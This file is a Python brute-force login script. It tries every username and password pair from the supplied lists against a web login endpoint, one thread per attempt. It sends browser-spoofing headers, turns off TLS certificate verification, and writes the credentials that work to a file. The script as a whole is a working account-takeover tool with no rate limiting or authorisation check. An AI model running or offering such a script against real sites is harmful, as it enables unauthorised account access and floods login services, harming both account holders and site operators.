import threading
import requests
from colorama import Fore

def login(url, username, password, success_file):
    """
    Attempt to login with provided credentials.
    """
    headers = {
        'Cookie': 'lang=en-US',
        'Sec-Ch-Ua': '"Chromium";v="121", "Not A(Brand";v="99"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Origin': url,
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': url,
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i',
    }

    data = {
        'username': username,
        'password': password
    }

    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)

        # Validate the response
        if response.ok:
            response_data = response.json()
            if response_data['success']:
                print(f"{Fore.GREEN}Login successful! URL: {url}, Username: {username}, Password: {password}{Fore.RESET}")
                with open(success_file, 'a') as file:
                    file.write(f"URL: {url}, Username: {username}, Password: {password}\n")
            else:
                print(f"{Fore.RED}Login failed for URL: {url} with username: {username}{Fore.RESET}")
        else:
            print(f"{Fore.RED}The server returned an error: {response.status_code} for URL: {url}{Fore.RESET}")

    except Exception as e:
        print(f"{Fore.RED}Error occurred while testing URL: {url} with username: {username} and password: {password}{Fore.RESET}")
        print(e)

def process_login(url, usernames, passwords, success_file):
    """
    Process login attempts for a given URL using provided credentials.
    """
    for username in usernames:
        for password in passwords:
            # Create a thread for each login attempt
            thread = threading.Thread(target=login, args=(url, username, password, success_file))
            thread.start()

def load_credentials_from_file(file_path):
    """
    Load credentials from a file.
    """
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]